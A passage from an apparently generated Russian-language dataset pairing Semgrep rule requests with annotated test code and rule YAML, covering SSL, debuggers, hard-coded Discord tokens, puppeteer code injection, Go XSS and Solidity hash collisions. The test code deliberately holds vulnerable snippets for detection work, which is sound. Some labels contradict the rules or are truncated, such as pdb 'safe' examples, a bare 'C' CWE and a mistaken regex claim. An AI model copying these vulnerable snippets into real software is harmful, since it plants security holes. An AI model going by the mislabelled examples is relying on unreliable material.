    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-326: Inadequate Encryption Strength\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-sql-database-require-ssl.tf\n# ruleid: gcp-sql-database-require-ssl\nresource \"google_sql_database_instance\" \"fail\" {\n  database_version = \"MYSQL_8_0\"\n  name             = \"instance\"\n  region           = \"us-central1\"\n  settings {\n    tier = \"db-f1-micro\"\n  }\n}\n\n# ok: gcp-sql-database-require-ssl\nresource \"google_sql_database_instance\" \"success\" {\n  database_version = \"MYSQL_8_0\"\n  name             = \"instance\"\n  region           = \"us-central1\"\n  ip_configuration {\n      ipv4_enabled = true\n      require_ssl = true\n  }\n}\n\n# ok: gcp-sql-database-require-ssl\nresource \"google_sql_database_instance\" \"main\" {\n  name      = \"some-example-name\"\n  database_version  = \"POSTGRES_15\"\n  region      = \"europe-west3\"\n  settings {\n    tier = \"db-f1-micro\"\n    ip_configuration {\n      ssl_mode = \"TRUSTED_CLIENT_CERTIFICATE_REQUIRED\"\n    }\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_sql_database_instance\" \"fail\" { ... }\n• resource \"google_sql_database_instance\" \"another_fail\" { ip_configuration { ... } }\n\nБезопасные паттерны:  \n• resource \"google_sql_database_instance\" \"success\" { ip_configuration { require_ssl = true ... } }\n• resource \"google_sql_database_instance\" \"secure\" { ip_configuration { ssl_mode = \"TRUSTED_CLIENT_CERTIFICATE_REQUIRED\" ... } }\n\nЛегенда аннотаций:\n- // ruleid:gcp-sql-database-require-ssl: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-sql-database-require-ssl: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-sql-database-require-ssl\n  patterns:\n  - pattern: resource\n  - pattern-inside: |\n      resource \"google_sql_database_instance\" \"...\" {\n          ...\n      }\n  - pattern-not-inside: |\n      resource \"google_sql_database_instance\" \"...\" {\n          ...\n          ip_configuration {\n              ...\n              require_ssl = true\n              ...\n          }\n          ...\n      }\n  - pattern-not-inside: |\n      resource \"google_sql_database_instance\" \"...\" {\n          ...\n          ip_configuration {\n              ...\n              ssl_mode = ...\n              ...\n          }\n          ...\n      }\n  message: >-\n    Ensure all Cloud SQL database instance requires all incoming connections to use SSL\n  metadata:\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-326: Inadequate Encryption Strength'\n    category: security\n    technology:\n    - terraform\n    - gcp\n    references:\n    - \"https://cloud.google.com/sql/docs/postgres/admin-api/rest/v1/instances#ipconfiguration\"\n    - \"https://owasp.org/Top10/A02_2021-Cryptographic_Failures\"\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Google Cloud SQL Database Instance, которые не требуют использования SSL для входящих соединений. Анализ выполняется путем поиска шаблонов HCL-кода, соответствующих ресурсам Google Cloud SQL Database Instance. Правило проверяет отсутствие явного указания require_ssl или ssl_mode, требующего SSL-соединений. Если такие поля отсутствуют или установлены некорректно, правило отмечает ресурс как потенциально небезопасный.\n\n# Ключевые элементы:\n- ID: gcp-sql-database-require-ssl\n- Язык: hcl \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-sql-database-require-ssl",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: use-either-wget-or-curl\nОписание уязвимости: 'wget' and 'curl' are similar tools. Choose one and do not install the other to decrease image size.\nCWE: \nТип анализа: search\nЯзык: dockerfile",
    "input": "Требования:\n- Язык: dockerfile\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: use-either-wget-or-curl.dockerfile\n# cf. https://github.com/hadolint/hadolint/wiki/DL4001\n\nFROM debian\n# ruleid: use-either-wget-or-curl\nRUN wget http://google.com\nRUN curl http://bing.com  # Ограничиваем длину\n\nОпасные паттерны:\n• FROM debian\n# ruleid: use-either-wget-or-curl\nRUN wget http://google.com\nRUN curl http://bing.com\n• FROM debian\n# ruleid: use-either-wget-or-curl\nRUN curl http://example.com\nRUN wget http://test.com\n\nБезопасные паттерны:  \n• FROM debian\n# safe: only using wget\nRUN wget http://google.com\n• FROM debian\n# safe: only using curl\nRUN curl http://bing.com\n\nЛегенда аннотаций:\n- // ruleid:use-either-wget-or-curl: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-either-wget-or-curl: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: use-either-wget-or-curl\n    severity: INFO\n    languages: [dockerfile]\n    message: >-\n      'wget' and 'curl' are similar tools. Choose one and do not install the other to decrease image size.\n    metadata:\n      source-rule-url: https://github.com/hadolint/hadolint/wiki/DL4001\n      references:\n        - https://github.com/hadolint/hadolint/wiki/DL4001\n      category: best-practice\n      technology:\n        - dockerfile\n    pattern-either:\n      - pattern: |\n          RUN wget ...\n          ...\n          RUN curl ...\n      - pattern: |\n          RUN curl ...\n          ...\n          RUN wget ...\n\n\n# Логика правила:\nЭто правило Semgrep выполняет поиск использования обоих инструментов wget и curl в одном Dockerfile. Оно использует конструкцию pattern-either для поиска двух возможных комбинаций команд RUN: первая комбинация включает сначала wget, а затем curl; вторая комбинация включает сначала curl, а затем wget. Это правило помогает обнаружить избыточное включение обоих инструментов, так как они выполняют схожие функции и их одновременная установка увеличивает размер образа контейнера.\n\n# Ключевые элементы:\n- ID: use-either-wget-or-curl\n- Язык: dockerfile \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "use-either-wget-or-curl",
      "language": "dockerfile",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: pdb-remove\nОписание уязвимости: pdb is an interactive debugging tool and you may have forgotten to remove it before committing your code\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: pdb.py\nimport pdb as db\n\n\ndef foo():\n    # ruleid:pdb-remove\n    db.set_trace()\n    # ok:pdb-remove\n    a = \"apple\"\n    #ok:pdb-remove\n    db = \"the string, not the library\"\n    #ok:pdb-remove\n    pdb = \"also a string\"\n    # ruleid:pdb-remove\n    pdb.Pdb.set_trace()\n    # ruleid:pdb-remove\n    db.Pdb.set_trace(...)  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: pdb.py\nimport pdb as db\n...\n# ruleid:pdb-remove\ndb.Pdb.set_trace(...)\n• // File: test.py\nimport pdb\n# ruleid:pdb-remove\npdb.Pdb().set_trace()\n\nБезопасные паттерны:  \n• // File: example.py\nimport pdb as db\n...\n# ok:pdb-remove\ndb.set_trace()\n• // File: another_example.py\nimport pdb\n...\n# ok:pdb-remove\npdb.set_trace()\n\nЛегенда аннотаций:\n- // ruleid:pdb-remove: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:pdb-remove: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: pdb-remove\n    pattern-either:\n      - pattern: pdb.$X(...)\n      - pattern: pdb.Pdb.$X(...)\n    message: >-\n      pdb is an interactive debugging tool and you may have forgotten to remove it before\n      committing your code\n    languages: [python]\n    severity: WARNING\n    metadata:\n      category: correctness\n      technology:\n        - python\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования pdb или pdb.Pdb в Python-коде, за которыми следуют возможные вызовы методов с аргументами (...). Такие вызовы могут указывать на забытый отладчик pdb, который не был удален перед коммитом кода.\n\n# Ключевые элементы:\n- ID: pdb-remove\n- Язык: python \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "pdb-remove",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: detect-mistral\nОписание уязвимости: Possibly found usage of AI: Mistral\nCWE: \nТип анализа: search\nЯзык: js",
    "input": "Требования:\n- Язык: js\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: detect-mistral.ts\n// ruleid: detect-mistral\nimport MistralClient from '@mistralai/mistralai';\n\nconst apiKey = process.env.MISTRAL_API_KEY;\n\n// ruleid: detect-mistral\nconst client = new MistralClient(apiKey);\n\n// ruleid: detect-mistral\nconst chatResponse = await client.chat({\n  messages: [{role: 'user', content: 'What is the best French cheese?'}],\n  model: 'mistral-large-latest',\n});\n\nconsole.log('Chat:', chatResponse.choices[0].message.content);  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: detect-mistral\nimport MistralClient from '@mistralai/mistralai';\n• // ruleid: detect-mistral\nconst client = new MistralClient(apiKey);\n• // ruleid: detect-mistral\nconst chatResponse = await client.chat({model: 'mistral-large-latest'})\n\nБезопасные паттерны:  \n• import SomeOtherClient from '@someotherai/someotherai';\n• const someClient = new SomeOtherClient(apiKey);\n• const response = await someClient.chat({model: 'someother-large-latest'})\n\nЛегенда аннотаций:\n- // ruleid:detect-mistral: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-mistral: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: detect-mistral\n    languages:\n      - js\n      - ts\n    severity: INFO\n    message: \"Possibly found usage of AI: Mistral\"\n    pattern-either:\n      - pattern: import \"@mistralai\"\n      - pattern: new MistralClient(...)\n      - pattern: |-\n          $CLIENT.chat({model: ...})\n    metadata:\n      references:\n        - https://semgrep.dev/blog/2024/detecting-shadow-ai\n      category: maintainability\n      technology:\n        - genAI\n        - LLMs\n      confidence: LOW\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска возможных случаев использования AI-модели Mistral в JavaScript или TypeScript коде. Анализ выполняется методом поиска (search) с использованием регулярных выражений и строковых шаблонов. Правило использует три варианта паттернов: импорт модуля '@mistralai', создание нового экземпляра класса MistralClient и вызов метода chat() объекта клиента с указанием модели 'mistral-large-latest'. Каждый из этих паттернов соответствует различным способам обращения к API Mistral.\n\n# Ключевые элементы:\n- ID: detect-mistral\n- Язык: js \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "detect-mistral",
      "language": "js",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: discord-api-token\nОписание уязвимости: A gitleaks discord-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: discord-api-token.go\n// ruleid: discord-api-token\ndiscord_api_token = \"94bec3f6741f06291e67cd8b90363b79c0b68024f65622c333d79f1055c4c65b\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: dangerous.go\nvar token = \"94bec3f6741f06291e67cd8b90363b79c0b68024f65622c333d79f1055c4c65b\"\n• // File: another_dangerous.go\nglobal_token := \"94bec3f6741f06291e67cd8b90363b79c0b68024f65622c333d79f1055c4c65b\"\n• // File: yet_another_dangerous.go\nconst apiKey = \"94bec3f6741f06291e67cd8b90363b79c0b68024f65622c333d79f1055c4c65b\"\n\nБезопасные паттерны:  \n• // File: safe.go\nvar token = os.Getenv(\"DISCORD_API_TOKEN\")\n• // File: secure.go\napi_key := getSecureToken()\n• // File: safe_code.go\nconfig := loadConfigFromVault()\n\nЛегенда аннотаций:\n- // ruleid:discord-api-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:discord-api-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: discord-api-token\n  message: A gitleaks discord-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:discord)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([a-f0-9]{64})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного токена Discord API в исходном коде. Регулярное выражение ищет строку, содержащую слово 'discord' или его вариации, за которым следует последовательность из 64 шестнадцатеричных символов, представляющих токен API. Правило применяет нечувствительность к регистру ('(?i)') и допускает различные разделители, такие как пробелы, знаки равенства и кавычки.\n\n# Ключевые элементы:\n- ID: discord-api-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "discord-api-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения puppeteer-evaluate-code-injection\nОписание уязвимости: If unverified user data can reach the `evaluate` method it can result in Server-Side Request Forgery vulnerabilities\nCWE: CWE-918: Server-Side Request Forgery (SSRF)\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-918: Server-Side Request Forgery (SSRF)\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: puppeteer-evaluate-code-injection.js\nconst puppeteer = require('puppeteer');\n\nasync function test2(userInput) {\n\n  const browser = await puppeteer.launch();\n  const page = await browser.newPage();\n\n  // ok:puppeteer-evaluate-code-injection\n  await page.evaluate(x => console.log(x), 5);\n\n  // ruleid:puppeteer-evaluate-code-injection\n  await page.evaluate(`fetch(${userInput})`);\n\n  await page.screenshot({path: 'example.png'});\n  await browser.close();\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• await page.evaluate(`fetch(${userInput})`)\n• await page.evaluateHandle(`fetch(${userInput})`)\n• await page.evaluateOnNewDocument(`fetch(${userInput})`)\n\nБезопасные паттерны:  \n• await page.evaluate(x => console.log(x), 5)\n• await page.evaluateHandle(x => console.log(x), 5)\n• await page.evaluateOnNewDocument(x => console.log(x), 5)\n\nЛегенда аннотаций:\n- // ruleid:puppeteer-evaluate-code-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:puppeteer-evaluate-code-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: puppeteer-evaluate-code-injection\n  message: >-\n    If unverified user data can reach the `evaluate` method it can result in Server-Side Request Forgery\n    vulnerabilities\n  metadata:\n    owasp:\n    - A10:2021 - Server-Side Request Forgery (SSRF)\n    cwe:\n    - 'CWE-918: Server-Side Request Forgery (SSRF)'\n    category: security\n    technology:\n    - puppeteer\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n    references:\n    - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  patterns:\n  - pattern-inside: |\n      require('puppeteer');\n      ...\n  - pattern-not-inside: |\n      var $INPUT = function $FNAME(...){...};\n      ...\n  - pattern-either:\n    - pattern: $PAGE.evaluate($INPUT,...)\n    - pattern: $PAGE.evaluateHandle($INPUT,...)\n    - pattern: $PAGE.evaluateOnNewDocument($INPUT,...)\n  - pattern-not: $PAGE.evaluate(\"...\",...)\n  - pattern-not: $PAGE.evaluate(function(...){...},...)\n  - pattern-not: $PAGE.evaluateHandle(\"...\",...)\n  - pattern-not: $PAGE.evaluateHandle(function(...){...},...)\n  - pattern-not: $PAGE.evaluateOnNewDocument(\"...\",...)\n  - pattern-not: $PAGE.evaluateOnNewDocument(function(...){...},...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода evaluate в библиотеке puppeteer с передачей пользовательских данных напрямую в метод без предварительной проверки. Анализ выполняется путем поиска вызовов evaluate, evaluateHandle и evaluateOnNewDocument методов страницы ($PAGE.evaluate, $PAGE.evaluateHandle, $PAGE.evaluateOnNewDocument). Правило исключает случаи, когда данные передаются непосредственно в виде строк или функций, а также исключения, где используется анонимная функция. Это позволяет обнаружить потенциальную угрозу SSRF (Server-Side Request Forgery), связанную с возможностью выполнения произвольных запросов от имени сервера.\n\n# Ключевые элементы:\n- ID: puppeteer-evaluate-code-injection\n- Язык: javascript \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "puppeteer-evaluate-code-injection",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения import-text-template\nОписание уязвимости: When working with web applications that involve rendering user-generated  content, it's important to properly escape any HTML content to prevent  Cross-Site Scripting (XSS) attacks. In Go, the `text/template` package does  not automatically escape HTML content, which can leave your application  vulnerable to these types of attacks. To mitigate this risk, it's  recommended to use the `html/template` package instead, which provides  built-in functionality for HTML escaping. By using `html/template` to render  your HTML content, you can help to ensure that your web application is more  secure and less susceptible to XSS vulnerabilities.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: import-text-template.go\n// cf. https://www.veracode.com/blog/secure-development/use-golang-these-mistakes-could-compromise-your-apps-security\n\npackage main\n\nimport (\n  \"net/http\"\n  // ruleid: import-text-template\n  \"text/template\"\n  \"encoding/json\"\n  \"io/ioutil\"\n  \"os\"\n)\n\nconst tmpl = \"\"\n\ntype TodoPageData struct {\n  PageTitle string\n  Todos []Todo\n}\n\ntype Todo struct {\n  Title string \"json:title\"\n  Done bool \"json:done\"\n}\n\nfunc (t Todo) ToString() string {\n  bytes, _ := json.Marshal(t)\n  return string(bytes)\n}\n\nfunc getTodos() []Todo {\n  todos := make([]Todo, 3)\n  raw, _ := ioutil.ReadFile(\"./todos.json\")\n  json.Unmarshal(raw, &todos)\n  return todos\n\n}\n\nfunc main() {\n  tmpl := template.Must(template.ParseFiles(\"index.html\"))\n\n  http.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n      data := TodoPageData {\n          PageTitle: \"My Todos!\",\n          Todos: getTodos(),\n      }\n\n      tmpl.Execute(w, data)\n\n  })\n\n  http.ListenAndServe(\":\" + os.Getenv(\"PORT\"), nil)\n}\n\n\n// File: import-text-template.fixed.go\n// cf. https://www.veracode.com/blog/secure-development/use-golang-these-mistakes-could-compromise-your-apps-security\n\npackage main\n\nimport (\n  \"net/http\"\n  // ruleid: import-text-template\n  \"html/template\"\n  \"encoding/json\"\n  \"io/ioutil\"\n  \"os\"\n)\n\nconst tmpl = \"\"\n\ntype TodoPageData struct {\n  PageTitle string\n  Todos []Todo\n}\n\ntype Todo struct {\n  Title string \"json:title\"\n  Done bool \"json:done\"\n}\n\nfunc (t Todo) ToString() string {\n  bytes, _ := json.Marshal(t)\n  return string(bytes)\n}\n\nfunc getTodos() []Todo {\n  todos := make([]Todo, 3)\n  raw, _ := ioutil.ReadFile(\"./todos.json\")\n  json.Unmarshal(raw, &todos)\n  return todos\n\n}\n\nfunc main() {\n  tmpl := template.Must(template.ParseFiles(\"index.html\"))\n\n  http.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n      data := TodoPageData {\n          PageTitle: \"My Todos!\",\n          Todos: getTodos(),\n      }\n\n      tmpl.Execute(w, data)\n\n  })\n\n  http.ListenAndServe(\":\" + os.Get  # Ограничиваем длину\n\nОпасные паттерны:\n• import (\"text/template\")\n• import (\n\t\"text/template\"\n)\n• var _ = text/template.Template{}\n\nБезопасные паттерны:  \n• import (\"html/template\")\n• import (\n\t\"html/template\"\n)\n• var _ = html/template.Template{}\n\nЛегенда аннотаций:\n- // ruleid:import-text-template: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:import-text-template: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: import-text-template\n  message: >-\n    When working with web applications that involve rendering user-generated \n    content, it's important to properly escape any HTML content to prevent \n    Cross-Site Scripting (XSS) attacks. In Go, the `text/template` package does \n    not automatically escape HTML content, which can leave your application \n    vulnerable to these types of attacks. To mitigate this risk, it's \n    recommended to use the `html/template` package instead, which provides \n    built-in functionality for HTML escaping. By using `html/template` to render \n    your HTML content, you can help to ensure that your web application is more \n    secure and less susceptible to XSS vulnerabilities.\n  metadata:\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    references:\n    - https://www.veracode.com/blog/secure-development/use-golang-these-mistakes-could-compromise-your-apps-security\n    category: security\n    technology:\n    - go\n    confidence: LOW\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n  severity: WARNING\n  patterns:\n    - pattern: |\n        import \"$IMPORT\"\n    - metavariable-regex:\n        metavariable: $IMPORT\n        regex: ^(text/template)$\n    - focus-metavariable: $IMPORT\n  fix: |\n    html/template\n  languages:\n  - go\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска импортов пакета 'text/template' в Go-коде, который используется для рендеринга пользовательского контента. Поскольку пакет 'text/template' не автоматически эскейпирует HTML контент, он может привести к уязвимостям XSS. Правило использует шаблон импорта с метавариабельной регуляркой для поиска именно этого пакета. Если пакет найден, выдается предупреждение о необходимости использования 'html/template' вместо него.\n\n# Ключевые элементы:\n- ID: import-text-template\n- Язык: go \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "import-text-template",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: encode-packed-collision\nОписание уязвимости: abi.encodePacked hash collision with variable length arguments in $F()\nCWE: C\nТип анализа: search\nЯзык: solidity",
    "input": "Требования:\n- Язык: solidity\n- Тип анализа: search\n- CWE: C\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: encode-packed-collision.sol\ncontract Test {\n  \n  function f(string memory a, bytes memory b) public pure returns (bytes32) {\n    // ruleid: encode-packed-collision\n    return keccak256(abi.encodePacked(a, b));\n  }\n\n  function f2(bytes memory a, bytes memory b) public pure returns (bytes32) {\n    // ruleid: encode-packed-collision\n    bytes memory x = abi.encodePacked(a, b);\n    return keccak256(x);\n  }\n\n  function query(\n        address from,\n        uint timeout,\n        string calldata dataSource,\n        string calldata selector\n    )\n        external\n        returns (uint)\n    {\n        if (getCodeSize(from) > 0) {\n            bytes memory bs = bytes(selector);\n            // '': Return whole raw response;\n            // Starts with '$': response format is parsed as json.\n            // Starts with '/': response format is parsed as xml/html.\n            if (bs.length == 0 || bs[0] == '$' || bs[0] == '/') {\n                // ruleid: encode-packed-collision\n                uint queryId = uint(keccak256(abi.encodePacked(\n                    ++requestIdSeed, from, timeout, dataSource, selector)));\n                uint idx = dispatchJob(TrafficType.UserQuery, queryId);\n                // TODO: keep id receipt and handle later in v2.0.\n                if (idx == UINTMAX) {\n                    emit LogMessage(\"No live working group, skipped query\");\n                    return 0;\n                }\n                Group storage grp = workingGroups[workingGroupIds[idx]];\n                PendingRequests[queryId] = PendingRequest(queryId, grp.groupId,grp.groupPubKey, from);\n                emit LogUrl(\n                    queryId,\n                    timeout,\n                    dataSource,\n                    selector,\n                    lastRandomness,\n                    grp.groupId\n                );\n                DOSPaymentInterface(addressBridge.getPaymentAddress()).chargeServiceFee(from,queryId,uint(TrafficType.UserQuery));\n                return queryId  # Ограничиваем длину\n\nОпасные паттерны:\n• function f(string memory a, bytes memory b) public pure returns (bytes32) {\n    return keccak256(abi.encodePacked(a, b));\n}\n• function g(bytes memory a, bytes memory b) public view returns (bytes32) {\n    bytes memory x = abi.encodePacked(a, b);\n    return keccak256(x);\n}\n• function h(address[] memory admins, address[] memory regularUsers, bytes calldata signature) external {\n    bytes32 hash = keccak256(abi.encodePacked(admins, regularUsers));\n}\n\nБезопасные паттерны:  \n• function safeFunction(string memory a, bytes memory b) public pure returns (bytes32) {\n    return keccak256(abi.encode(a, b));\n}\n• function anotherSafeFunction(bytes memory a, bytes memory b) public view returns (bytes32) {\n    bytes memory x = abi.encode(a, b);\n    return keccak256(x);\n}\n• function secureFunction(address[] memory admins, address[] memory regularUsers, bytes calldata signature) external {\n    bytes32 hash = keccak256(abi.encode(admins, regularUsers));\n}\n\nЛегенда аннотаций:\n- // ruleid:encode-packed-collision: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:encode-packed-collision: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n-\n  id: encode-packed-collision\n  message: abi.encodePacked hash collision with variable length arguments in $F()\n  metadata:\n    category: security\n    technology:\n      - solidity\n    cwe: \"CWE-20: Improper Input Validation\"\n    confidence: HIGH\n    likelihood: MEDIUM\n    impact: MEDIUM\n    subcategory:\n        - vuln\n    references:\n      - https://swcregistry.io/docs/SWC-133\n  patterns:\n    - pattern-either:\n      - pattern-inside: |\n          function $F(..., bytes $A, ..., bytes $B, ...) public {\n            ...\n          }\n      - pattern-inside: |\n          function $F(..., string $A, ..., string $B, ...) public {\n            ...\n          }\n      - pattern-inside: |\n          function $F(..., bytes $A, ..., string $B, ...) public {\n            ...\n          }\n      - pattern-inside: |\n          function $F(..., string $A, ..., bytes $B, ...) public {\n            ...\n          }\n      - pattern-inside: |\n          function $F(..., address[] $A, ..., address[] $B, ...) public {\n            ...\n          }\n      - pattern-inside: |\n          function $F(..., uint256[] $A, ..., uint256[] $B, ...) public {\n            ...\n          }\n      - pattern-inside: |\n          function $F(..., bytes $A, ..., bytes $B, ...) external {\n            ...\n          }\n      - pattern-inside: |\n          function $F(..., string $A, ..., string $B, ...) external {\n            ...\n          }\n      - pattern-inside: |\n          function $F(..., bytes $A, ..., string $B, ...) external {\n            ...\n          }\n      - pattern-inside: |\n          function $F(..., string $A, ..., bytes $B, ...) external {\n            ...\n          }\n      - pattern-inside: |\n          function $F(..., address[] $A, ..., address[] $B, ...) external {\n            ...\n          }\n      - pattern-inside: |\n          function $F(..., uint256[] $A, ..., uint256[] $B, ...) external {\n            ...\n          }\n    - pattern-either:\n      - pattern: |\n          keccak256(abi.encodePacked(..., $A, $B, ...))\n      - pattern: |\n          $X = abi.encodePacked(..., $A, $B, ...);\n          ...\n          keccak256($X);\n  languages:\n    - solidity\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции abi.encodePacked внутри функций Solidity, которые принимают переменное количество аргументов типа bytes, string или массивов адресов и чисел. Опасность заключается в возможности коллизии хэшей при использовании abi.encodePacked, особенно когда аргументы имеют переменную длину. Правило проверяет наличие вызовов keccak256 с аргументами, созданными через abi.encodePacked, либо непосредственное создание промежуточной переменной ($X), содержащей результат abi.encodePacked, перед последующим вычислением хэша.\n\n# Ключевые элементы:\n- ID: encode-packed-collision\n- Язык: solidity \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "encode-packed-collision",
      "language": "solidity",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: react-unsanitized-method\nОписание уязвимости: Detection of $HTML from non-constant definition. This can inadvertently expose users to cross-site scripting (XSS) attacks if this comes from user-provided input. If you have to use $HTML, consider using a sanitization library such as DOMPurify to sanitize your HTML.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: taint\nЯзык: typescript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
